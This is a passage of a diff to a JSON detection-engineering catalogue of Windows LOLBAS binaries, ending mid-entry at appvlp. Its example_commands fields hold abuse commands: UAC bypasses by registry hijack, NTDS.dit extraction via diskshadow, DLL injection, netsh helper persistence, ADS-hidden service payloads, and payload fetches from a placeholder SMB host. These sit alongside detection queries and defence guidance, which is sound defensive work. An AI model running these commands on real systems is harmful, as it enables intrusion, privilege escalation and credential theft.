@@ -1,7 +1,7 @@
 {
   "generated": "2026-09-14",
-  "scope": "25 built-in Windows binaries with documented living-off-the-land (LOLBAS-style) abuse patterns, covering download, execution, compilation, application-whitelisting-bypass, and persistence tradecraft relevant to SOC triage and detection engineering.",
-  "count": 25,
+  "scope": "40 built-in Windows binaries with documented living-off-the-land (LOLBAS-style) abuse patterns, covering download, execution, compilation, application-whitelisting-bypass, UAC-bypass, and persistence tradecraft relevant to SOC triage and detection engineering.",
+  "count": 40,
   "note": "All example commands use RFC5737 documentation IP ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) and a fictional corp.local / CORP domain in place of any real attacker-controlled infrastructure or internal hostname.",
   "lolbins": [
     {
@@ -827,6 +827,508 @@
       "sources": [
         "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Schtasks.yml",
         "https://attack.mitre.org/techniques/T1053/005/"
+      ]
+    },
+    {
+      "id": "msdt",
+      "name": "msdt.exe",
+      "path": "C:\\Windows\\System32\\msdt.exe",
+      "category": "Execute",
+      "description": "Microsoft Support Diagnostic Tool that runs built-in Windows troubleshooting packs (diagcab/XML) to diagnose and optionally auto-fix system problems. It is LOLBAS-relevant because a crafted diagnostic-pack answer file can drive it into launching an attacker-supplied MSI or command, including the CVE-2022-30190 ('Follina') remote-template execution path.",
+      "legitimate_use": "Used by help desk staff and end users to run built-in Windows troubleshooters (network, printer, program compatibility, etc.) that diagnose and sometimes automatically repair common configuration problems.",
+      "attack_techniques": [
+        {"id": "T1218", "name": "System Binary Proxy Execution"},
+        {"id": "T1202", "name": "Indirect Command Execution"}
+      ],
+      "example_commands": [
+        {"command": "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af payload.xml /skip TRUE", "purpose": "Runs the Program Compatibility troubleshooter against a crafted answer file that launches an attacker-supplied MSI"},
+        {"command": "msdt.exe /id PCWDiagnostic /skip force /param \"IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../calc.exe\"", "purpose": "Executes arbitrary commands via the PCWDiagnostic troubleshooter pack (CVE-2022-30190 'Follina'); ineffective on systems patched since June 2022"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"msdt.exe\"\n| where ProcessCommandLine has_any (\"IT_BrowseForFile\", \"PCWDiagnostic\", \"-af \")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName",
+        "sigma": "title: Suspicious Msdt Diagnostic Pack Execution\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\msdt.exe'\n    CommandLine|contains:\n      - 'IT_BrowseForFile'\n      - 'PCWDiagnostic'\n      - '-af '\n  condition: selection\nlevel: high",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"msdt.exe\"\n| filter action_process_image_command_line contains \"IT_BrowseForFile\" or action_process_image_command_line contains \"PCWDiagnostic\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line, causality_actor_process_image_name"
+      },
+      "false_positives": [
+        "Legitimate use of built-in Windows troubleshooting packs by help desk staff or end users",
+        "Remote-assistance tooling that triggers PCWDiagnostic or similar packs during support sessions"
+      ],
+      "defence_guidance": [
+        "Apply the June 2022 Windows security update, which closes the CVE-2022-30190 (Follina) template-injection path",
+        "Disable the ms-msdt protocol handler via registry on estates with no legitimate remote-diagnostics workflow",
+        "Alert on msdt.exe spawned by Office applications (winword.exe, excel.exe) rather than the Get Help/Troubleshooting UI"
+      ],
+      "related_lolbins": ["mshta", "hh"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Msdt.yml",
+        "https://attack.mitre.org/techniques/T1218/",
+        "https://attack.mitre.org/techniques/T1202/"
+      ]
+    },
+    {
+      "id": "diskshadow",
+      "name": "diskshadow.exe",
+      "path": "C:\\Windows\\System32\\diskshadow.exe",
+      "category": "Execute",
+      "description": "Command-line tool that exposes Volume Shadow Copy Service (VSS) functionality, driven interactively or by a script file. It is LOLBAS-relevant because its script mode can extract locked files such as NTDS.dit from a shadow copy, and its 'exec' command spawns an arbitrary child process, indirectly proxying execution.",
+      "legitimate_use": "Used by backup administrators and storage engineers to create, manage, and script Volume Shadow Copy snapshots on Windows Server.",
+      "attack_techniques": [
+        {"id": "T1003.003", "name": "OS Credential Dumping: NTDS"},
+        {"id": "T1202", "name": "Indirect Command Execution"}
+      ],
+      "example_commands": [
+        {"command": "diskshadow.exe /s script.txt", "purpose": "Runs a prepared diskshadow script that creates a shadow copy and extracts NTDS.dit for offline credential extraction"},
+        {"command": "diskshadow> exec payload.exe", "purpose": "Spawns an arbitrary child process from within an interactive or scripted diskshadow session"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"diskshadow.exe\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName",
+        "sigma": "title: Diskshadow Scripted Execution or Child Process\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\diskshadow.exe'\n    CommandLine|contains: '/s '\n  condition: selection\nlevel: high",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"diskshadow.exe\" or causality_actor_process_image_name = \"diskshadow.exe\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line, causality_actor_process_image_name"
+      },
+      "false_positives": [
+        "Scheduled backup jobs on Domain Controllers or file servers that script VSS snapshot creation",
+        "Storage or DR tooling that scripts diskshadow for snapshot orchestration"
+      ],
+      "defence_guidance": [
+        "Alert on diskshadow.exe spawning a child process, which is unusual outside its own scripted VSS workflow",
+        "Restrict diskshadow script (/s) execution to known backup-service accounts and known script paths",
+        "Monitor for VSS snapshot creation immediately followed by access to NTDS.dit or SAM/SYSTEM hive copies"
+      ],
+      "related_lolbins": ["esentutl"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Diskshadow.yml",
+        "https://attack.mitre.org/techniques/T1003/003/",
+        "https://attack.mitre.org/techniques/T1202/"
+      ]
+    },
+    {
+      "id": "mavinject",
+      "name": "mavinject.exe",
+      "path": "C:\\Windows\\System32\\mavinject.exe",
+      "category": "Execute",
+      "description": "Application Virtualization (App-V) utility that injects a DLL into a running process by PID. It is LOLBAS-relevant because its /INJECTRUNNING switch lets a standard user inject and execute an arbitrary DLL inside any accessible running process, including a DLL staged inside an NTFS Alternate Data Stream.",
+      "legitimate_use": "Used internally by Microsoft Application Virtualization (App-V) to inject the App-V client DLL into virtualized applications at launch.",
+      "attack_techniques": [
+        {"id": "T1218.013", "name": "System Binary Proxy Execution: Mavinject"},
+        {"id": "T1564.004", "name": "Hide Artifacts: NTFS File Attributes"}
+      ],
+      "example_commands": [
+        {"command": "mavinject.exe 3110 /INJECTRUNNING payload.dll", "purpose": "Injects an attacker DLL into the running process with PID 3110"},
+        {"command": "mavinject.exe 4172 /INJECTRUNNING notes.txt:payload.dll", "purpose": "Injects a DLL staged inside an Alternate Data Stream of notes.txt into the running process with PID 4172"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"mavinject.exe\"\n| where ProcessCommandLine has \"/INJECTRUNNING\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma": "title: Mavinject Process Injection\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\mavinject.exe'\n    CommandLine|contains: '/INJECTRUNNING'\n  condition: selection\nlevel: high",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"mavinject.exe\"\n| filter action_process_image_command_line contains \"INJECTRUNNING\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "Legitimate App-V client activity injecting its own runtime DLL into virtualized application processes"
+      ],
+      "defence_guidance": [
+        "Mavinject.exe should not run at all on endpoints where App-V is not deployed; block via WDAC/AppLocker on those estates",
+        "Where App-V is in use, alert on mavinject.exe targeting a PID outside the App-V client process tree",
+        "Flag any mavinject.exe command line referencing a colon-delimited (ADS) DLL path"
+      ],
+      "related_lolbins": ["rasautou", "register-cimprovider"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Mavinject.yml",
+        "https://attack.mitre.org/techniques/T1218/013/",
+        "https://attack.mitre.org/techniques/T1564/004/"
+      ]
+    },
+    {
+      "id": "register-cimprovider",
+      "name": "Register-cimprovider.exe",
+      "path": "C:\\Windows\\System32\\Register-cimprovider.exe",
+      "category": "Execute",
+      "description": "Registers a Common Information Model (CIM)/WMI provider DLL with the WMI subsystem. It is LOLBAS-relevant because its -path switch loads and executes any target DLL supplied on the command line, regardless of whether it is a genuine WMI provider.",
+      "legitimate_use": "Used during installation of WMI provider software, such as hardware monitoring or management agents, to register their provider DLL with WMI.",
+      "attack_techniques": [
+        {"id": "T1218", "name": "System Binary Proxy Execution"}
+      ],
+      "example_commands": [
+        {"command": "Register-cimprovider.exe -path payload.dll", "purpose": "Loads and executes an attacker-supplied DLL via the CIM provider registration path"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"register-cimprovider.exe\"\n| where ProcessCommandLine has \"-path\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName",
+        "sigma": "title: Register-cimprovider Loading Suspicious DLL\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\Register-cimprovider.exe'\n    CommandLine|contains: '-path'\n  filter_installers:\n    ParentImage|endswith: '\\msiexec.exe'\n  condition: selection and not filter_installers\nlevel: medium",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"register-cimprovider.exe\"\n| filter action_process_image_command_line contains \"-path\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line, causality_actor_process_image_name"
+      },
+      "false_positives": [
+        "Legitimate WMI provider installation by hardware or management-agent software during setup"
+      ],
+      "defence_guidance": [
+        "Register-cimprovider.exe is rarely invoked outside software installation; alert on any invocation not spawned by msiexec.exe or a known installer",
+        "Restrict execution to signed DLLs located in trusted provider directories via WDAC"
+      ],
+      "related_lolbins": ["mavinject", "rasautou"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Register-cimprovider.yml",
+        "https://attack.mitre.org/techniques/T1218/"
+      ]
+    },
+    {
+      "id": "rasautou",
+      "name": "rasautou.exe",
+      "path": "C:\\Windows\\System32\\rasautou.exe",
+      "category": "Execute",
+      "description": "Legacy Remote Access Dialer automation utility used to load and drive dialer DLLs. It is LOLBAS-relevant because its -d/-p switches load a target DLL and invoke a named exported function, proxying execution through a signed OS binary.",
+      "legitimate_use": "Historically used to automate dial-up/RAS connections by loading a custom dialer DLL and invoking its entry/exit-point functions.",
+      "attack_techniques": [
+        {"id": "T1218", "name": "System Binary Proxy Execution"}
+      ],
+      "example_commands": [
+        {"command": "rasautou.exe -d payload.dll -p ExportedFunction -a a -e e", "purpose": "Loads an attacker-supplied DLL and invokes the named export, proxying code execution through rasautou"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"rasautou.exe\"\n| where ProcessCommandLine has \"-d\" and ProcessCommandLine has \"-p\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma": "title: Rasautou DLL Execution\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\rasautou.exe'\n    CommandLine|contains:\n      - '-d '\n      - '-p '\n  condition: selection\nlevel: high",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"rasautou.exe\"\n| filter action_process_image_command_line contains \"-d \" and action_process_image_command_line contains \"-p \"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "Legacy dial-up/RAS automation scripts on older Windows builds (rare on Windows 10/11, where the relevant options were removed)"
+      ],
+      "defence_guidance": [
+        "Rasautou.exe has no remaining legitimate use on modern Windows 10/11 estates since Microsoft removed the relevant dialer options; block via WDAC with minimal operational impact",
+        "Where retained for legacy compatibility, alert on any -d/-p command-line usage"
+      ],
+      "related_lolbins": ["mavinject", "register-cimprovider"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Rasautou.yml",
+        "https://attack.mitre.org/techniques/T1218/"
+      ]
+    },
+    {
+      "id": "vsjitdebugger",
+      "name": "vsjitdebugger.exe",
+      "path": "C:\\Windows\\System32\\vsjitdebugger.exe",
+      "category": "Execute",
+      "description": "The Just-In-Time debugger shipped with Visual Studio, normally launched when an unhandled exception triggers a debug prompt. It is LOLBAS-relevant because it will directly launch and attach to any executable passed on the command line, proxying execution through a signed Microsoft binary.",
+      "legitimate_use": "Invoked by Windows Error Reporting to offer developers the option to attach a Visual Studio debugger to a crashing process.",
+      "attack_techniques": [
+        {"id": "T1127", "name": "Trusted Developer Utilities Proxy Execution"}
+      ],
+      "example_commands": [
+        {"command": "vsjitdebugger.exe payload.exe", "purpose": "Launches an arbitrary executable as a debugged subprocess of vsjitdebugger.exe"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"vsjitdebugger.exe\"\n| where InitiatingProcessFileName !in~ (\"werfault.exe\", \"devenv.exe\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName",
+        "sigma": "title: Suspicious Vsjitdebugger Execution\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\vsjitdebugger.exe'\n  filter_wer:\n    ParentImage|endswith: '\\WerFault.exe'\n  condition: selection and not filter_wer\nlevel: medium",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"vsjitdebugger.exe\"\n| filter causality_actor_process_image_name != \"werfault.exe\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line, causality_actor_process_image_name"
+      },
+      "false_positives": [
+        "Legitimate JIT-debug prompts on developer workstations with Visual Studio installed"
+      ],
+      "defence_guidance": [
+        "Vsjitdebugger.exe is only present where Visual Studio is installed; block via WDAC on non-developer endpoints",
+        "On developer systems, alert on vsjitdebugger.exe launched directly from a command shell or script host rather than via the JIT-debug crash prompt"
+      ],
+      "related_lolbins": ["csc", "msbuild"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OtherMSBinaries/Vsjitdebugger.yml",
+        "https://attack.mitre.org/techniques/T1127/"
+      ]
+    },
+    {
+      "id": "netsh",
+      "name": "netsh.exe",
+      "path": "C:\\Windows\\System32\\netsh.exe",
+      "category": "Persistence",
+      "description": "Command-line tool for configuring network interfaces, firewall rules, and other networking components. It is LOLBAS-relevant because its extensible helper-DLL mechanism ('add helper') registers an attacker DLL to load and execute every time netsh.exe subsequently runs, providing both persistence and an execution proxy.",
+      "legitimate_use": "Used by network administrators to configure interfaces, routing, firewall rules, and WLAN profiles from the command line or in scripts.",
+      "attack_techniques": [
+        {"id": "T1546.007", "name": "Event Triggered Execution: Netsh Helper DLL"}
+      ],
+      "example_commands": [
+        {"command": "netsh.exe add helper payload.dll", "purpose": "Registers an attacker DLL as a netsh helper, which loads and executes every time netsh.exe is subsequently invoked"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"netsh.exe\"\n| where ProcessCommandLine has \"add helper\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma": "title: Netsh Helper DLL Persistence\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\netsh.exe'\n    CommandLine|contains: 'add helper'\n  condition: selection\nlevel: high",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"netsh.exe\"\n| filter action_process_image_command_line contains \"add helper\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "Legitimate third-party netsh helper DLLs registered by networking or VPN client software (rare, but present in some enterprise deployments)"
+      ],
+      "defence_guidance": [
+        "Alert on any 'netsh add helper' invocation, since registering a new helper DLL is rare in normal administrative use",
+        "Periodically audit the registered helper DLL list under HKLM\\SOFTWARE\\Microsoft\\NetSh for unrecognized entries",
+        "Require change-managed approval for any netsh helper registration in production environments"
+      ],
+      "related_lolbins": ["schtasks", "dnscmd"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Netsh.yml",
+        "https://attack.mitre.org/techniques/T1546/007/"
+      ]
+    },
+    {
+      "id": "sc",
+      "name": "sc.exe",
+      "path": "C:\\Windows\\System32\\sc.exe",
+      "category": "Execute",
+      "description": "Command-line interface to the Windows Service Control Manager. It is LOLBAS-relevant because a service binPath can point at a file staged inside an NTFS Alternate Data Stream; starting or reconfiguring that service executes the hidden payload while visible service metadata references only the host file.",
+      "legitimate_use": "Used by administrators to create, configure, query, start, and stop Windows services from the command line or in deployment scripts.",
+      "attack_techniques": [
+        {"id": "T1543.003", "name": "Create or Modify System Process: Windows Service"},
+        {"id": "T1564.004", "name": "Hide Artifacts: NTFS File Attributes"}
+      ],
+      "example_commands": [
+        {"command": "sc create evilsvc binPath= \"C:\\ADS\\file.txt:cmd.exe /c whoami\" start= auto & sc start evilsvc", "purpose": "Creates a new service whose binPath points at a payload hidden inside an Alternate Data Stream, then starts it"},
+        {"command": "sc config ExistingSvc binPath= \"C:\\ADS\\file.txt:cmd.exe /c whoami\" & sc start ExistingSvc", "purpose": "Reconfigures an existing service's binPath to reference an ADS-hidden payload"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"sc.exe\"\n| where ProcessCommandLine has_any (\"create\", \"config\") and ProcessCommandLine has \"binPath\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma": "title: Suspicious Sc.exe Service Creation or Modification\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\sc.exe'\n    CommandLine|contains:\n      - 'create'\n      - 'config'\n  ads_pattern:\n    CommandLine|re: '\\w+\\.\\w+:\\w+\\.exe'\n  condition: selection and ads_pattern\nlevel: high",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"sc.exe\"\n| filter action_process_image_command_line contains \"binPath\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "Legitimate service creation or reconfiguration by software installers and deployment tooling"
+      ],
+      "defence_guidance": [
+        "Alert on sc.exe binPath arguments containing a colon-delimited path pattern (filename:stream), which indicates ADS usage",
+        "Baseline expected service creators (SYSTEM, deployment service accounts) and alert on service creation by interactive user sessions"
+      ],
+      "related_lolbins": ["control", "msiexec"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Sc.yml",
+        "https://attack.mitre.org/techniques/T1543/003/",
+        "https://attack.mitre.org/techniques/T1564/004/"
+      ]
+    },
+    {
+      "id": "makecab",
+      "name": "makecab.exe",
+      "path": "C:\\Windows\\System32\\makecab.exe",
+      "category": "Download",
+      "description": "Packages files into a Microsoft Cabinet (.cab) archive. It is LOLBAS-relevant because it can fetch a file from a remote SMB/WebDAV share while compressing it locally, and can store its compressed output inside an NTFS Alternate Data Stream to hide it from normal directory listings.",
+      "legitimate_use": "Used by developers and IT packaging tools to build .cab archives for driver and software distribution.",
+      "attack_techniques": [
+        {"id": "T1105", "name": "Ingress Tool Transfer"},
+        {"id": "T1564.004", "name": "Hide Artifacts: NTFS File Attributes"}
+      ],
+      "example_commands": [
+        {"command": "makecab.exe \\\\198.51.100.20\\share\\payload.exe payload.cab", "purpose": "Fetches a remote file over SMB/WebDAV and compresses it into a local CAB file"},
+        {"command": "makecab.exe payload.exe notes.txt:payload.cab", "purpose": "Compresses a local file into a CAB stored inside an Alternate Data Stream of notes.txt"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"makecab.exe\"\n| where ProcessCommandLine has \"\\\\\\\\\" or ProcessCommandLine matches regex @\"[A-Za-z0-9_.]+:[A-Za-z0-9_.]+\\.cab\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma": "title: Makecab Remote Fetch or ADS Storage\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_remote:\n    Image|endswith: '\\makecab.exe'\n    CommandLine|contains: '\\\\\\\\'\n  selection_ads:\n    Image|endswith: '\\makecab.exe'\n    CommandLine|re: '\\w+\\.\\w+:\\w+\\.cab'\n  condition: 1 of selection_*\nlevel: high",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"makecab.exe\"\n| filter action_process_image_command_line contains \"\\\\\\\\\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "Legitimate driver/software packaging workflows that build CAB archives",
+        "IT deployment tooling compressing files for distribution"
+      ],
+      "defence_guidance": [
+        "Alert on makecab.exe processes with a UNC/WebDAV source path, since routine CAB packaging is normally local-only",
+        "Flag makecab.exe command lines containing a colon-delimited destination path (ADS indicator)"
+      ],
+      "related_lolbins": ["expand", "certutil"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Makecab.yml",
+        "https://attack.mitre.org/techniques/T1105/",
+        "https://attack.mitre.org/techniques/T1564/004/"
+      ]
+    },
+    {
+      "id": "expand",
+      "name": "expand.exe",
+      "path": "C:\\Windows\\System32\\expand.exe",
+      "category": "Download",
+      "description": "Decompresses and copies files, including Cabinet (.cab) archives. It is LOLBAS-relevant because it will copy a file from a remote SMB/WebDAV path to local disk, and can also write its output into an NTFS Alternate Data Stream.",
+      "legitimate_use": "Used to extract driver and system files from .cab archives during OS installation, updates, and manual driver deployment.",
+      "attack_techniques": [
+        {"id": "T1105", "name": "Ingress Tool Transfer"},
+        {"id": "T1564.004", "name": "Hide Artifacts: NTFS File Attributes"}
+      ],
+      "example_commands": [
+        {"command": "expand.exe \\\\198.51.100.30\\share\\payload.bat payload.bat", "purpose": "Copies a remote file over SMB/WebDAV to a local destination path"},
+        {"command": "expand.exe \\\\198.51.100.30\\share\\payload.bat notes.txt:payload.bat", "purpose": "Copies a remote file into an Alternate Data Stream of a local file, hiding it from normal directory listings"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"expand.exe\"\n| where ProcessCommandLine has \"\\\\\\\\\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma": "title: Expand.exe Remote File Copy or ADS Write\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\expand.exe'\n    CommandLine|contains: '\\\\\\\\'\n  condition: selection\nlevel: high",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"expand.exe\"\n| filter action_process_image_command_line contains \"\\\\\\\\\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "Legitimate driver/CAB extraction during OS setup, Windows Update, or manual driver installation"
+      ],
+      "defence_guidance": [
+        "Alert on expand.exe processes with a UNC/WebDAV source argument, since routine CAB extraction is normally local-only",
+        "Flag expand.exe command lines containing a colon-delimited destination path (ADS indicator)"
+      ],
+      "related_lolbins": ["makecab", "certutil"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Expand.yml",
+        "https://attack.mitre.org/techniques/T1105/",
+        "https://attack.mitre.org/techniques/T1564/004/"
+      ]
+    },
+    {
+      "id": "eventvwr",
+      "name": "eventvwr.exe",
+      "path": "C:\\Windows\\System32\\eventvwr.exe",
+      "category": "Bypass",
+      "description": "Displays Windows Event Logs in a GUI console (mmc.exe hosting eventvwr.msc). It is LOLBAS-relevant because at startup it resolves the handler for .msc files via HKCU\\Software\\Classes\\mscfile\\shell\\open\\command; if that registry value is hijacked, eventvwr.exe launches the attacker's binary as a high-integrity process with no UAC prompt.",
+      "legitimate_use": "Used by administrators and support staff to view and triage Windows Event Log entries through a GUI console.",
+      "attack_techniques": [
+        {"id": "T1548.002", "name": "Abuse Elevation Control Mechanism: Bypass User Account Control"}
+      ],
+      "example_commands": [
+        {"command": "reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d \"C:\\Users\\Public\\payload.exe\" /f && eventvwr.exe", "purpose": "Hijacks the mscfile open-command registry key so eventvwr.exe silently launches the attacker binary at high integrity without a UAC prompt"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceRegistryEvents\n| where RegistryKey has @\"Classes\\mscfile\\shell\\open\\command\"\n| project Timestamp, DeviceName, AccountName, RegistryKey, RegistryValueData",
+        "sigma": "title: Eventvwr UAC Bypass via Mscfile Hijack\nlogsource:\n  category: registry_set\n  product: windows\ndetection:\n  selection:\n    TargetObject|contains: 'Classes\\mscfile\\shell\\open\\command'\n  condition: selection\nlevel: critical",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.REGISTRY\n| filter action_registry_key_name contains \"mscfile\\\\shell\\\\open\\\\command\"\n| fields agent_hostname, actor_effective_username, action_registry_data, action_registry_full_key"
+      },
+      "false_positives": [
+        "Normal administrative use of Event Viewer (the registry key is not modified in legitimate use, so any modification is itself a strong indicator)"
+      ],
+      "defence_guidance": [
+        "Alert on any modification to HKCU\\Software\\Classes\\mscfile\\shell\\open\\command, since it has no legitimate reason to change",
+        "Alert on eventvwr.exe spawning any child process other than mmc.exe",
+        "Restrict standard-user write access to HKCU\\Software\\Classes\\mscfile via application control where feasible"
+      ],
+      "related_lolbins": ["computerdefaults"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Eventvwr.yml",
+        "https://attack.mitre.org/techniques/T1548/002/"
+      ]
+    },
+    {
+      "id": "computerdefaults",
+      "name": "ComputerDefaults.exe",
+      "path": "C:\\Windows\\System32\\ComputerDefaults.exe",
+      "category": "Bypass",
+      "description": "Opens the 'Default apps' settings page for choosing default programs for web browsing, email, and media. It is LOLBAS-relevant because at startup it resolves a command via HKCU\\Software\\Classes\\ms-settings\\Shell\\open\\command; if that registry value is hijacked, ComputerDefaults.exe launches the attacker's binary as a high-integrity process with no UAC prompt.",
+      "legitimate_use": "Used to open the Windows 'Choose default apps' settings page for end users configuring default browser, mail, and media applications.",
+      "attack_techniques": [
+        {"id": "T1548.002", "name": "Abuse Elevation Control Mechanism: Bypass User Account Control"}
+      ],
+      "example_commands": [
+        {"command": "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\open\\command /d \"C:\\Users\\Public\\payload.exe\" /f && computerdefaults.exe", "purpose": "Hijacks the ms-settings open-command registry key so ComputerDefaults.exe silently launches the attacker binary at high integrity without a UAC prompt"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceRegistryEvents\n| where RegistryKey has @\"Classes\\ms-settings\\Shell\\open\\command\"\n| project Timestamp, DeviceName, AccountName, RegistryKey, RegistryValueData",
+        "sigma": "title: ComputerDefaults UAC Bypass via Ms-Settings Hijack\nlogsource:\n  category: registry_set\n  product: windows\ndetection:\n  selection:\n    TargetObject|contains: 'Classes\\ms-settings\\Shell\\open\\command'\n  condition: selection\nlevel: critical",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.REGISTRY\n| filter action_registry_key_name contains \"ms-settings\\\\Shell\\\\open\\\\command\"\n| fields agent_hostname, actor_effective_username, action_registry_data, action_registry_full_key"
+      },
+      "false_positives": [
+        "Normal administrative use of the Default Apps settings page (the registry key is not modified in legitimate use)"
+      ],
+      "defence_guidance": [
+        "Alert on any modification to HKCU\\Software\\Classes\\ms-settings\\Shell\\open\\command, since it has no legitimate reason to change",
+        "Alert on ComputerDefaults.exe spawning any unexpected child process",
+        "Monitor process-creation telemetry for ComputerDefaults.exe launching binaries outside the Settings app"
+      ],
+      "related_lolbins": ["eventvwr"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/ComputerDefaults.yml",
+        "https://attack.mitre.org/techniques/T1548/002/"
+      ]
+    },
+    {
+      "id": "appvlp",
+      "name": "Appvlp.exe",
+      "path": "C:\\Program Files\\Microsoft Office\\root\\client\\appvlp.exe",
+      "category": "Execute",
+      "description": "Application Virtualization launcher shipped with Microsoft Office, originally intended to run App-V sequenced applications. It is LOLBAS-relevant because it is a Microsoft Office-trusted process that will execute a local or WebDAV-hosted batch file or relaunch PowerShell, and its execution is exempt from certain Office Attack Surface Reduction (ASR) rules.",
+      "legitimate_use": "Launches Application Virtualization (App-V) sequenced applications packaged with Microsoft Office 2016 and later.",
+      "attack_techniques": [
+        {"id": "T1218", "name": "System Binary Proxy Execution"}
+      ],
+      "example_commands": [
